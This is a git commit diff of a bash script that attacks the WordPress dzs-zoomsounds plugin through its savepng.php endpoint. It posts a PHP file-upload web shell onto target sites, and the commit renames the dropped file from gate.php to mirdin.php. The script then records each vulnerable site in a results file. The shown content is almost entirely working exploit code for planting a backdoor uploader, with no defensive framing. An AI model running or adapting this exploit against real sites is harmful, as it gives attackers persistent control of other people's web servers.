4db8818e0279cfeca28c0cc5c78af6d26fc3e78a
kyukazami <55656379+kyukazamiqq@users.noreply.github.com>
2021-10-21 08:48:44 +0700

    Update dzs.sh

--- dzs.sh
+++ dzs.sh
@@ -23,7 +23,7 @@ green='\e[42m'
 site=$1
 thread=$2 
 
-if [[ $(curl -s --max-time 10 --connect-timeout 10 -d '<?php echo "<form method=post enctype=multipart/form-data><input type=file name=gntng><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[gntng][tmp_name], $_FILES[gntng][name])){echo "Sukses 😛";}else{ echo "Gagal!";}}?>' $site"/wp-content/plugins/dzs-zoomsounds/savepng.php?location=gate.php") =~ "mirdin.php" ]]; then
+if [[ $(curl -s --max-time 10 --connect-timeout 10 -d '<?php echo "<form method=post enctype=multipart/form-data><input type=file name=gntng><input type=submit name=upload value=upload></form>";if($_POST[upload]){if(@copy($_FILES[gntng][tmp_name], $_FILES[gntng][name])){echo "Sukses 😛";}else{ echo "Gagal!";}}?>' $site"/wp-content/plugins/dzs-zoomsounds/savepng.php?location=mirdin.php") =~ "mirdin.php" ]]; then
 	printf "${green}[Vuln]${classic} => $site/wp-content/plugins/dzs-zoomsounds/mirdin.php \n"
 	printf "$site/wp-content/plugins/dzs-zoomsounds/mirdin.php\n" >> zoom_res.txt
 	else
